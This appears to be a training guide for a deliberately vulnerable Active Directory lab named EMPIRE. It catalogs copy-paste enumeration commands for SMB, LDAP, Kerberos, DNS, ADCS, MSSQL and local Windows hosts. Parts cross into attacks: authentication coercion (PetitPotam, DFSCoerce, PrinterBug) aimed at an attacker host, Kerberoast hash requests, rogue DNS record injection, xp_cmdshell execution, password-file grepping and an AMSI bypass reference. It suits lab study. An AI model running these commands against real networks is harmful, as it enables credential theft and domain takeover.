# 02b — Enumeration Catalog (ENUM-001..080)

The most-skipped, most-rewarding phase. If you take only **one** thing from EMPIRE, take this: *good enumeration is the difference between a 4-hour solve and a 4-day one.* Every flag in `PLAN.md` is reachable by an attacker who enumerates well. This page catalogs every enumeration primitive EMPIRE exposes, what it returns, what tool to use, and what to grep the output for.

> **Per-host crib sheets** in [`docs/hosts/`](hosts/) tell you what's reachable on each box; this page is the **catalog of techniques** that apply across hosts.

---

## How to use this page

For each enum ID:
- **What it returns** — the data you'll see.
- **Tools** — canonical CLI.
- **Steps** — copy-paste-ready.
- **Looks for** — what to grep the output for.
- **Detection** — Event ID / log source.
- **Forward to** — which CRED/LAT/PE/PER/DF flags this enables.

---

## A. Network-layer enumeration (no creds, no AD)

### ENUM-001 — Live host sweep (ICMP / ARP / TCP-SYN)
**What it returns:** which IPs respond on the lab subnets.
**Tools:** `nmap`, `masscan`, `arp-scan`, `fping`.
```bash
fping -a -g 10.10.0.0/21 2>/dev/null
sudo nmap -n -sn 10.10.0.0/21 10.20.0.0/24 10.30.0.0/24
sudo arp-scan -l -I virbr1                  # only on host bridge
sudo masscan 10.10.0.0/21 -p1-65535 --rate 10000
```
**Looks for:** DCs (10.10.0.10, 10.20.0.10, 10.30.0.10, 10.10.0.11), ADCS (10.10.0.12), servers (10.10.0.13–14), workstations (10.10.0.100+).
**Detection:** IDS spike, ARP storm.
**Forward to:** ENUM-002+.

### ENUM-002 — TCP service fingerprint (NSE scripts)
**What it returns:** running service + version per port.
**Tools:** `nmap -sV -sC`, `rustscan`.
```bash
nmap -Pn -n -sS -sV -sC -p- --min-rate 1000 -oA scan_full 10.10.0.10
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3389,5985,9389 -sV \
     --script "(*-enum* and not brute and not dos)" 10.10.0.10
```
**Looks for:** `Microsoft Windows Active Directory LDAP`, `Kerberos`, `MSSQL`, `WinRM`, `RDP`, `IIS`, `ADCS web enrollment`.

### ENUM-003 — UDP scan (slow but mandatory)
**What it returns:** SNMP/NetBIOS/DNS/IPMI/SQL-Browser/IKE/LDAP-ping.
**Tools:** `nmap -sU`, `unicornscan`.
```bash
sudo nmap -sU -p 53,67,68,88,123,137,138,161,162,389,500,1434,4500,5353 10.10.0.0/21
```
**Looks for:** 137 (NetBIOS), 161 (SNMP), 1434 (SQL Browser), 500 (IKE), 5353 (mDNS).

### ENUM-004 — OS / DCE-RPC fingerprint
**Tools:** `nmap -O`, `nmap --script smb-os-discovery,smb-protocols`, `rpcdump.py`.
```bash
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.0.10
impacket-rpcdump 10.10.0.10                # endpoint mapper enum
```
**Looks for:** SMB version (`SMB1` ⇒ EternalBlue path), signing required Y/N, OS build (CVE matching).

### ENUM-005 — IPv6 link-local presence
**What it returns:** every Windows host advertises an `fe80::` link-local; useful for mitm6.
```bash
sudo ndp -an                                # macOS
ip -6 neigh
ping6 -I virbr1 ff02::1
```
**Forward to:** IA-009 (mitm6).

---

## B. SMB / NetBIOS / CIFS

### ENUM-006 — SMB null session
**What it returns:** server name, OS, domain, share list (sometimes), user list (rarely).
**Tools:** `enum4linux-ng`, `smbclient`, `nxc`, `rpcclient`.
```bash
enum4linux-ng -A 10.10.0.10
smbclient -L //10.10.0.10/ -N
nxc smb 10.10.0.10 -u '' -p ''             # null
nxc smb 10.10.0.10 -u 'guest' -p ''        # guest
rpcclient -U "" -N 10.10.0.10
```
**Looks for:** NETLOGON/SYSVOL, custom shares (`Public`, `Shared`, `Backup`, `Software`), domain SID.
**EMPIRE wired:** `RestrictAnonymous=0`, null-session pipes = `netlogon,samr,lsarpc,browser,srvsvc`.

### ENUM-007 — SMB share inventory + ACL
```bash
smbmap -H 10.10.0.10 -u '' -p ''
smbmap -H 10.10.0.13 -u peter.parker -p 'EmpireLab2024!' -R PublicShare
nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --shares
```
**Looks for:** `READ, WRITE` on shares you shouldn't write to, `Everyone:FullAccess`.
**EMPIRE wired:** `\\scarif\PublicShare` Everyone:F.

### ENUM-008 — SYSVOL / NETLOGON content
**What it returns:** Group Policy, logon scripts, GPP cpasswords, mapped drives.
```bash
smbclient //10.10.0.10/SYSVOL -U peter.parker%EmpireLab2024!
# inside: prompt OFF; recurse ON; mget *
# Or:
nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M gpp_password
nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M gpp_autologin
```
**Looks for:** `Groups.xml` with `cpassword=`, `.bat`/`.ps1` with `net use ... /user:`.
**EMPIRE wired:** `Groups.xml` cpassword + `login.bat` cleartext + `map_backup.bat`.
**Forward to:** CRED-029 (GPP decryption).

### ENUM-009 — RPC pipes via authenticated/null session
**What it returns:** users, groups, password policy, SIDs, RID cycling.
**Tools:** `rpcclient`, `impacket-samrdump`, `impacket-lookupsid`, `nxc --rid-brute`.
```bash
rpcclient -U "" -N 10.10.0.10
# inside rpcclient:
srvinfo                       # server info
enumdomusers                  # users (needs null or auth)
enumdomgroups
queryuser 0x1f4               # by RID (500 = Administrator)
querygroup 0x200              # 512 = Domain Admins
queryuseraliases <sid>        # group memberships
getdompwinfo                  # password policy
enumdomains
lookupnames Administrator     # name → SID
lookupsids S-1-5-21-...-500   # SID → name
# RID cycling (anon SID enum):
impacket-lookupsid 'empire.local/'@10.10.0.10
nxc smb 10.10.0.10 -u '' -p '' --rid-brute 10000
```
**Pipes hit:** `\PIPE\samr` (SAMR — users/groups), `\PIPE\lsarpc` (LSA — SIDs/policy), `\PIPE\srvsvc` (server info), `\PIPE\wkssvc` (workstation/transports), `\PIPE\netlogon` (domain trust).
**EMPIRE wired:** all five pipes in NullSessionPipes on coruscant.

### ENUM-010 — RPC endpoint mapper
**What it returns:** dynamic-port-mapped RPC interfaces and their UUIDs.
```bash
impacket-rpcdump 10.10.0.10
# Shows: drsuapi (E3514235-...), efsrpc (DF1941C5-...), dfsnm (4FC742E0-...),
#        atsvc (1FF70682-...), eventlog (82273FDC-...), winreg (338CD001-...),
#        svcctl (367ABB81-...), spoolss (12345678-...), dnsserver (50ABC2A4-...),
#        lsarpc (12345778-...), samr (12345778-...), netlogon (12345678-1234-...),
#        wkssvc (6BFFD098-...), srvsvc (4B324FC8-...)
```
**Looks for:** `MS-EFSR` (PetitPotam target), `MS-DFSNM` (DFSCoerce), `MS-RPRN` (PrinterBug), `MS-DRSR` (DCSync), `MS-PAR` (Print AD Print Notifications).

### ENUM-011 — SMB enumeration with credentials
```bash
nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' \
    --users --groups --shares --pass-pol --loggedon-users --sessions --disks --local-groups
nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M spider_plus -o READ_ONLY=False
```
**Looks for:** local admin on what hosts (`(Pwn3d!)` in nxc output), loggedon-users (Kerberoast targets), enabled accounts.

### ENUM-012 — SMB1 detection (EternalBlue gate)
```bash
nmap -p 445 --script smb-protocols 10.10.0.0/21
nxc smb 10.10.0.0/21 -M ms17-010
```

### ENUM-013 — Print Spooler reachability (PrinterBug / PrintNightmare gate)
```bash
impacket-rpcdump 10.10.0.10 | grep -i spool
python3 SpoolSample.py attacker coruscant.empire.local
nxc smb 10.10.0.0/21 -M printerbug
nxc smb 10.10.0.0/21 -M spooler
```

### ENUM-014 — EFSRPC reachability (PetitPotam gate)
```bash
impacket-rpcdump 10.10.0.10 | grep -i efsr
python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' attacker 10.10.0.10
nxc smb 10.10.0.0/21 -M petitpotam
```

### ENUM-015 — DFS Namespace coercion gate (DFSCoerce)
```bash
nxc smb 10.10.0.10 -M dfscoerce
python3 dfscoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local attacker 10.10.0.10
```

### ENUM-016 — WebClient (WebDAV) reachability (ShadowCoerce / Coerce → HTTP)
```bash
nxc smb 10.10.0.0/21 -M webdav
# manual:
curl -X PROPFIND http://10.10.0.10/                   # WebDAV server-side
```
**EMPIRE wired:** WebClient service auto-started on coruscant.

---

## C. LDAP / ADWS

### ENUM-017 — LDAP anonymous bind
```bash
ldapsearch -x -H ldap://10.10.0.10 -s base -b "" "(objectclass=*)"        # RootDSE
ldapsearch -x -H ldap://10.10.0.10 -b "DC=empire,DC=local" "(objectclass=user)" cn
```
**Looks for:** `defaultNamingContext`, `domainFunctionality`, `supportedSASLMechanisms`, `dsHeuristics`.
**EMPIRE wired:** `LDAPServerIntegrity=1` (no signing required → anon bind tolerated).

### ENUM-018 — Authenticated LDAP enumeration
**Tools:** `ldapsearch`, `windapsearch`, `ldapdomaindump`, `nxc ldap`, `bloodhound-python`, `adidnsdump`.
```bash
ldapdomaindump -u corp\\peter.parker -p 'EmpireLab2024!' 10.10.0.10
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' \
    --users --groups --asreproast asrep.txt --kerberoasting kerb.txt \
    --trusted-for-delegation --password-not-required --admin-count --gmsa --bloodhound --collection All
windapsearch -d empire.local -u peter.parker -p 'EmpireLab2024!' --dc-ip 10.10.0.10 -m all
```

### ENUM-019 — LDAP filters worth memorizing
```ldap
(objectClass=user)                                  # all users
(&(objectClass=user)(servicePrincipalName=*))       # Kerberoast candidates
(userAccountControl:1.2.840.113556.1.4.803:=4194304) # DONT_REQ_PREAUTH (AS-REP)
(userAccountControl:1.2.840.113556.1.4.803:=524288)  # TRUSTED_FOR_DELEGATION (unconstrained)
(msDS-AllowedToDelegateTo=*)                         # constrained delegation
(msDS-AllowedToActOnBehalfOfOtherIdentity=*)        # RBCD set
(adminCount=1)                                       # protected (AdminSDHolder)
(memberOf=CN=Domain Admins,CN=Users,DC=empire,DC=local)
(objectCategory=computer)                            # all computers
(operatingSystem=*Server*)
(servicePrincipalName=MSSQLSvc/*)                    # SQL SPNs
(msDS-KeyCredentialLink=*)                           # Shadow Cred set
(altSecurityIdentities=*)                            # ESC14 candidates
(objectClass=trustedDomain)                          # forest/external trusts
(objectClass=foreignSecurityPrincipal)               # cross-forest membership
(userAccountControl:1.2.840.113556.1.4.803:=32)      # PASSWD_NOTREQD
(pwdLastSet=0)                                       # must-change accounts
(lockoutTime>=1)                                     # locked-out
(dNSHostName=*)                                      # any DNS-registered object
```

### ENUM-020 — Trusts + cross-domain principals
```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-domains
ldapsearch -x -H ldap://10.10.0.10 -D 'corp\peter.parker' -w 'EmpireLab2024!' \
    -b "CN=System,DC=empire,DC=local" "(objectClass=trustedDomain)"
nltest /domain_trusts /v                       # from Windows
```
**Looks for:** `flatName`, `trustPartner`, `trustDirection`, `trustAttributes` (0x40 = forest-transitive, 0x4 = quarantined, 0x8 = forest-wide auth).

### ENUM-021 — BloodHound ingest (the big one)
```bash
bloodhound-python -u peter.parker -p 'EmpireLab2024!' -d empire.local -ns 10.10.0.10 -c all
# .json into BloodHound CE → "Shortest Paths to Domain Admins"
# Add custom queries from BadBlood/Improvements repo:
#  - Find Tier-0 users not in Protected Users
#  - Computers with unconstrained delegation
#  - Users with msDS-KeyCredentialLink set
#  - Cross-forest ACL paths
```

### ENUM-022 — ADWS (Active Directory Web Services, 9389)
**What it returns:** same data as LDAP but via SOAP — sometimes still allowed when LDAP signing blocks unsigned binds.
**Tools:** `SOAPHound`, `Get-ADUser` (PowerShell over ADWS), `pyadws`.
```bash
# SOAPHound on Windows (or Wine):
SOAPHound.exe --buildcache -c cache.txt
SOAPHound.exe -c cache.txt --bhdump -o bh-output
```

### ENUM-023 — Global Catalog (3268 / 3269)
**What it returns:** forest-wide partial attribute index — useful for cross-domain enum from one DC.
```bash
ldapsearch -x -H ldap://10.10.0.10:3268 -D 'corp\peter.parker' -w 'EmpireLab2024!' \
    -b "" "(&(objectClass=user)(sAMAccountName=*adm*))"
```

### ENUM-024 — LDAP password policy + lockout
```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --pass-pol
ldapsearch ... -b "DC=empire,DC=local" "(objectClass=domain)" \
    minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration
# Fine-grained:
ldapsearch ... -b "CN=Password Settings Container,CN=System,..." \
    "(objectClass=msDS-PasswordSettings)"
```

### ENUM-025 — ADIDNS records via LDAP
**Tools:** `adidnsdump`, raw LDAP.
```bash
adidnsdump -u corp\\peter.parker -p 'EmpireLab2024!' 10.10.0.10
# Dump every DNS record in the AD-integrated zone, including ones not in zone transfer.
```
**Forward to:** PER-030 ADIDNS time bomb.

---

## D. Kerberos

### ENUM-026 — Kerberos username enumeration (no creds)
**What it returns:** which usernames exist (KDC returns different errors for valid-but-revoked vs unknown).
```bash
kerbrute userenum -d empire.local --dc 10.10.0.10 users.txt
# Also tries common name combos:
kerbrute userenum -d empire.local --dc 10.10.0.10 \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```

### ENUM-027 — AS-REP roastable accounts (no creds)
```bash
impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt -format hashcat
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --asreproast asrep.hashes
```
**Forward to:** CRED-002 / IA-006.

### ENUM-028 — Kerberoast SPN enumeration
```bash
impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 -request
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --kerberoasting kerb.hashes
```
**Forward to:** CRED-001.

### ENUM-029 — Kerberos encryption types
```bash
ldapsearch ... "(servicePrincipalName=*)" msDS-SupportedEncryptionTypes
# 4 = RC4 only, 24 = AES, 28 = all
```
**Looks for:** RC4-only service accounts → easier Kerberoast.

### ENUM-030 — Delegation enumeration
```bash
# Unconstrained (TRUSTED_FOR_DELEGATION):
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation
# Constrained (msDS-AllowedToDelegateTo):
ldapsearch ... "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
# RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set):
ldapsearch ... "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName
```
**Forward to:** CRED-016/017/018.

### ENUM-031 — Kerberos clock skew check (timing matters)
```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='empire.local' 10.10.0.10
# If your clock is >5 min off the KDC: every ticket request will fail with KRB_AP_ERR_SKEW.
sudo ntpdate 10.10.0.10
```

### ENUM-032 — Pre2k / disabled / locked-out / never-logged-on
```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --password-not-required
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=32)"   # PASSWD_NOTREQD
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=2)"    # ACCOUNTDISABLE
ldapsearch ... "(!(lastLogon=*))"                                  # never logged on
```
**EMPIRE wired:** `PRE2K01$` with PASSWD_NOTREQD and password = `pre2k01` (lowercase sAMAccountName w/o $).

---

## E. DNS

### ENUM-033 — Forward / reverse / SRV records
```bash
dig @10.10.0.10 empire.local ANY
dig @10.10.0.10 -t SRV _ldap._tcp.dc._msdcs.empire.local      # find DCs
dig @10.10.0.10 -t SRV _kerberos._tcp.empire.local
dig @10.10.0.10 -t SRV _gc._tcp.empire.local                  # Global Catalogs
dig @10.10.0.10 -x 10.10.0.10                               # PTR
```

### ENUM-034 — AXFR zone transfer
```bash
dig @10.10.0.10 empire.local AXFR
dig @10.10.0.10 _msdcs.empire.local AXFR
dig @10.20.0.10 rebel.local AXFR
dig @10.30.0.10 trade.corp AXFR
```
**EMPIRE wired:** `Set-DnsServerPrimaryZone -SecureSecondaries TransferAnyServer` on coruscant. Finance / root: gap — try anyway.

### ENUM-035 — NSEC walking / subdomain brute
```bash
dnsenum --dnsserver 10.10.0.10 empire.local
gobuster dns -d empire.local -r 10.10.0.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### ENUM-036 — DNS dynamic-update probe
```bash
nsupdate -d
> server 10.10.0.10
> zone empire.local
> update add evil.empire.local 60 A 10.10.0.99
> send
```
**Forward to:** mitm6, ADIDNS poisoning.

---

## F. NetBIOS / WSD / LLMNR / mDNS / WPAD

### ENUM-037 — NetBIOS name service
```bash
nbtscan -r 10.10.0.0/21
nmblookup -A 10.10.0.10
```
**Looks for:** workgroup name, `<00>` (workstation), `<20>` (server), `<1B>` (master browser), `<1C>` (domain).

### ENUM-038 — Passive LLMNR / NBT-NS / mDNS / WSD listening
```bash
sudo responder -I virbr1 -A           # analyze-only mode, doesn't poison
```
**Looks for:** clients asking for `wpad`, `proxy`, mistyped hosts → poisoning targets later.

### ENUM-039 — WPAD probe
```bash
curl -sv http://wpad.empire.local/wpad.dat
curl -sv http://10.10.0.10/wpad.dat
```

### ENUM-040 — WSD (Web Services for Devices, port 3702/UDP, 5357/TCP)
```bash
sudo nmap -p 3702 -sU --script broadcast-listener 10.10.0.0/24
```

---

## G. Web / HTTP / IIS

### ENUM-041 — HTTP service discovery
```bash
nmap -p 80,443,8080,8443,5985,5986,8530,8531,8000 -sV --script http-enum 10.10.0.0/21
whatweb http://10.10.0.12/
nikto -h http://10.10.0.12
```

### ENUM-042 — ADCS web enrollment
```bash
curl -sk http://10.10.0.12/certsrv/ -u 'corp\peter.parker:EmpireLab2024!'
# returns "Microsoft Active Directory Certificate Services"
nxc smb 10.10.0.12 -u peter.parker -p 'EmpireLab2024!' -M adcs
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
```
**EMPIRE wired:** /certsrv with Basic + Windows auth, no EPA, HTTP only → **ESC8**.

### ENUM-043 — IIS WebDAV (PROPFIND)
```bash
davtest -url http://10.10.0.12/
curl -X PROPFIND -H "Depth: 1" http://10.10.0.12/ -u 'corp\peter.parker:EmpireLab2024!'
```

### ENUM-044 — Web directory brute
```bash
feroxbuster -u http://10.10.0.12/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x aspx,asp,html
gobuster dir -u http://10.10.0.12/ -w /usr/share/wordlists/dirb/common.txt
```

### ENUM-045 — Internal web app fingerprint
**Looks for:** SharePoint (`/_layouts/15/`), Exchange (`/owa/`, `/ecp/`, `/EWS/Exchange.asmx`, `/autodiscover/`), SCCM (`/sms_mp/.sms_aut`, `/CCM_System/`), WSUS (`/ClientWebService/client.asmx`, `/ApiRemoting30/WebService.asmx`).
```bash
for path in /owa/ /ecp/ /EWS/Exchange.asmx /autodiscover/autodiscover.xml \
            /sms_mp/.sms_aut /CCM_System/request /ClientWebService/client.asmx \
            /ApiRemoting30/WebService.asmx /_vti_pvt/ /jenkins/ /confluence/ ; do
  echo "==> $path"; curl -sk -o /dev/null -w "%{http_code}\n" "https://10.10.0.12$path"
done
```

---

## H. MSSQL

### ENUM-046 — SQL Server Browser (UDP 1434)
```bash
nmap -p 1434 -sU --script ms-sql-info 10.10.0.0/21
python3 mssql-tcp-info.py 10.10.0.0/21       # broadcast probe
```

### ENUM-047 — Authenticated SQL enum
```bash
nxc mssql 10.10.0.14 -u peter.parker -p 'EmpireLab2024!' \
    --local-auth -q "SELECT name FROM sys.databases"
mssqlclient.py corp/peter.parker:'EmpireLab2024!'@10.10.0.14 -windows-auth
# inside:
enum_db
enum_links                          # linked servers (lateral!)
enum_impersonate                    # EXECUTE AS LOGIN/USER
enum_users
xp_cmdshell                         # if enabled
```

### ENUM-048 — Linked servers (the underrated lateral path)
```sql
SELECT * FROM master..sysservers
SELECT * FROM openquery("LINKED",'SELECT @@version')
EXEC ('xp_cmdshell ''whoami''') AT [LINKED]
```

### ENUM-049 — PowerUpSQL (Windows)
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo
Get-SQLServerLink -Verbose
Invoke-SQLAudit -Verbose
```

---

## I. WinRM / WSMan / PowerShell remoting

### ENUM-050 — WinRM reachability
```bash
nxc winrm 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
evil-winrm -i 10.10.0.10 -u peter.parker -p 'EmpireLab2024!'
curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\peter.parker:EmpireLab2024!'
```
**EMPIRE wired:** 5985 HTTP open everywhere with `AllowUnencrypted=true`, Basic + CredSSP.

---

## J. RDP

### ENUM-051 — RDP service + NLA + encryption
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.0.0/21
rdesktop -u peter.parker 10.10.0.100
xfreerdp /v:10.10.0.100 /u:peter.parker /p:'EmpireLab2024!'
```
**Looks for:** `NLA: No` → CVE-2019-0708 (BlueKeep) candidate, `CredSSP_Required: false`.

---

## K. WMI / DCOM

### ENUM-052 — WMI query (over DCOM 135 → dynamic)
```bash
impacket-wmiexec corp/peter.parker:'EmpireLab2024!'@10.10.0.100
# Or query without exec:
impacket-wmiquery corp/peter.parker:'EmpireLab2024!'@10.10.0.100 \
    -namespace 'root/cimv2' 'SELECT * FROM Win32_Process'
```

### ENUM-053 — DCOM application enumeration
```powershell
Get-CimInstance Win32_DCOMApplication
Get-CimInstance -Namespace TRADE\Subscription -ClassName __EventFilter
```
**Looks for:** persistent WMI subscriptions = backdoor.

---

## L. SNMP (gap on EMPIRE — IA-018 enable plan)

### ENUM-054 — SNMP community guess
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.0.0/21
snmpwalk -v2c -c public 10.10.0.10
snmp-check -c public 10.10.0.10
```
**Looks for:** users (`1.3.6.1.4.1.77.1.2.25`), processes, network interfaces, software install dates.

---

## M. Certificate Services deep enum

### ENUM-055 — All ESC checks at once
```bash
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
# Without auth (if you have certificate name):
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -enabled -dc-only
```
**Looks for:** `ESC1` … `ESC16`, `Web Enrollment` URL, `User Specified SAN`, `Manager Approval = False`, `Authorized Signatures Required = 0`, `Enrollment Rights`, `Object Control Permissions`.

### ENUM-056 — CA database / pending requests
```powershell
certutil -view -restrict "RequestID=*" -out "RequestID,Requester Name,Certificate Template,Notbefore"
certutil -getreg CA\CRLPeriodUnits
certutil -getreg CA\EditFlags                # 0x00040000 = EDITF_ATTRIBUTESUBJECTALTNAME2 → ESC6
```

### ENUM-057 — NTAuth store (who can authenticate via cert)
```powershell
certutil -store -enterprise NTAuth
# Anyone trying to add a cert here = persistence attempt.
```

---

## N. ADCS web endpoint enum

### ENUM-058 — Cert enrollment policy web service (CES)
```bash
curl -sk "https://10.10.0.12/ADPolicyProvider_CEP_UsernamePassword/service.svc/CEP"
curl -sk "https://10.10.0.12/corp-CA-CA_CES_UsernamePassword/service.svc/CES"
```

---

## O. Group Policy / SYSVOL deep enum

### ENUM-059 — All GPOs + linked OUs
```bash
nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M enum_gpp
# Or:
ldapsearch ... -b "CN=Policies,CN=System,DC=empire,DC=local" "(objectClass=groupPolicyContainer)"
# From Windows:
Get-GPO -All
Get-GPOReport -All -ReportType HTML -Path .\gpos.html
```

### ENUM-060 — Per-OU GPO inheritance
```powershell
Get-GPInheritance -Target "OU=Workstations,DC=empire,DC=local"
gpresult /h gp.html         # local
gpresult /scope:computer /v
```

### ENUM-061 — Scheduled tasks via GPO (PER-034 hunting)
```bash
find /tmp/sysvol -name "ScheduledTasks.xml"
# Look in: Policies/{GUID}/Machine/Preferences/ScheduledTasks/
grep -r "runAs" /tmp/sysvol/                # accounts with stored passwords
```

---

## P. Local enumeration (after a foothold on a Windows host)

### ENUM-062 — winPEAS / Seatbelt / SharpUp
```cmd
winPEASx64.exe quiet cmd
Seatbelt.exe -group=all
SharpUp.exe audit
```

### ENUM-063 — Token / privilege check
```cmd
whoami /all
whoami /priv
whoami /groups
```
**Looks for:** `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege` (→ Potato chain), `SeBackupPrivilege` / `SeRestorePrivilege` (→ NTDS/SAM dump), `SeDebugPrivilege`, `SeLoadDriverPrivilege` (→ BYOVD), `SeTakeOwnershipPrivilege`, `SeManageVolumePrivilege` (CVE-2021-1732 variant).

### ENUM-064 — Local users / groups / saved creds
```cmd
net user
net localgroup administrators
cmdkey /list                          # Credential Manager
runas /savecred /user:EMPIRE\admin cmd  # use saved creds
vaultcmd /listcreds:"Windows Credentials" /all
```

### ENUM-065 — Process + service inventory
```cmd
tasklist /v /fo csv
sc query state= all
sc qc <svc>                           # binPath, account, dependencies
wmic service get name,pathname,startname,startmode
```
**Looks for:** Unquoted paths with spaces, weak ACL on binPath, services running as user accounts.

### ENUM-066 — Installed software (CVE-relevant)
```cmd
wmic product get name,version,vendor
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion
```

### ENUM-067 — Patch level
```cmd
wmic qfe list brief
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
```
**Forward to:** WES-NG / Watson → exploit picker.

### ENUM-068 — AlwaysInstallElevated + UAC level
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```
**EMPIRE wired:** Both AIE set on tatooine; ConsentPromptBehaviorAdmin=0.

### ENUM-069 — LAPS + gMSA enumeration
```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M laps
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --gmsa
# LDAP:
ldapsearch ... "(ms-Mcs-AdmPwd=*)" cn ms-Mcs-AdmPwd
ldapsearch ... "(msDS-GroupMSAMembership=*)" sAMAccountName msDS-GroupMSAMembership
```

### ENUM-070 — Files & locations to grep on every box
```cmd
:: Hardcoded passwords are routine here
type C:\Users\*\AppData\Local\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
findstr /si "password" *.xml *.ini *.txt *.config *.bat *.ps1 C:\Users\* C:\Temp\* C:\inetpub\*
:: Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\unattend.xml
:: McAfee SiteList
type "C:\Program Files (x86)\McAfee\Common Framework\SiteList.xml"
```

---

## Q. Hybrid / Cloud / SaaS edges

### ENUM-071 — Azure AD Connect / Entra
```powershell
Get-ADSyncConnectorRunStatus
Get-ADSyncScheduler
# Detect AAD Connect server: ldap (servicePrincipalName=MSOL_*)
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --query \
    "(samaccountname=MSOL_*)" "sAMAccountName description"
```

### ENUM-072 — Office 365 tenant discovery (from Kali)
```bash
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=peter.parker@empire.local&xml=1"
curl -s "https://login.microsoftonline.com/empire.local/.well-known/openid-configuration"
```

---

## R. Defender / EDR / logging visibility

### ENUM-073 — Defender status (post-foothold)
```powershell
Get-MpPreference | fl ExclusionPath,ExclusionExtension,ExclusionProcess,DisableRealtimeMonitoring
Get-MpComputerStatus
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0}
```

### ENUM-074 — Sysmon / EDR / AMSI
```powershell
Get-Service | ? {$_.Name -match 'sysmon|carbon|crowd|cylance|sentinel|defender'}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
```

---

## S. The pipe catalog — every MS-RPC interface worth knowing

| Pipe | UUID prefix | What it does | Tool / abuse |
|---|---|---|---|
| `\PIPE\lsarpc` | 12345778- | LSA: SIDs, policy, trust info | `rpcclient`, `impacket-lookupsid` |
| `\PIPE\samr` | 12345778- | SAM: users, groups, password policy | `rpcclient enumdomusers`, `impacket-samrdump` |
| `\PIPE\netlogon` | 12345678-1234- | NRPC: secure channel, ZeroLogon | `zerologon_tester.py`, `secretsdump -no-pass` |
| `\PIPE\srvsvc` | 4B324FC8- | Server svc: shares, sessions | `rpcclient netshareenum`, `NetSessionEnum` |
| `\PIPE\wkssvc` | 6BFFD098- | Workstation: transports, currently-logged-on | `rpcclient enumtrans` |
| `\PIPE\svcctl` | 367ABB81- | Service control: create/start svcs | `psexec.py`, `services.py` |
| `\PIPE\winreg` | 338CD001- | Remote registry | `reg.py`, `impacket-reg query` |
| `\PIPE\atsvc` | 1FF70682- | Scheduled tasks (legacy AT) | `atexec.py` |
| `\PIPE\spoolss` | 12345678- | Print spooler, PrinterBug, PrintNightmare | `SpoolSample.py`, `PrintNightmare.py` |
| `\PIPE\eventlog` | 82273FDC- | Read event log remotely | `wevtutil`, `Get-WinEvent -ComputerName` |
| `\PIPE\drsuapi` | E3514235- | Replication / DCSync | `secretsdump -just-dc` |
| `\PIPE\efsrpc` (lsarpc multiplex) | DF1941C5- | EFS RPC — PetitPotam | `PetitPotam.py` |
| `\PIPE\dfsnm` | 4FC742E0- | DFS namespace — DFSCoerce | `dfscoerce.py` |
| `\PIPE\dnsserver` | 50ABC2A4- | DNS server — DnsAdmins → ServerLevelPluginDll RCE | `dnscmd /config /ServerLevelPluginDll` |
| `\PIPE\fssagentrpc` | A8E0653C- | VSS (Shadow Copy) — ShadowCoerce | `ShadowCoerce.py` |
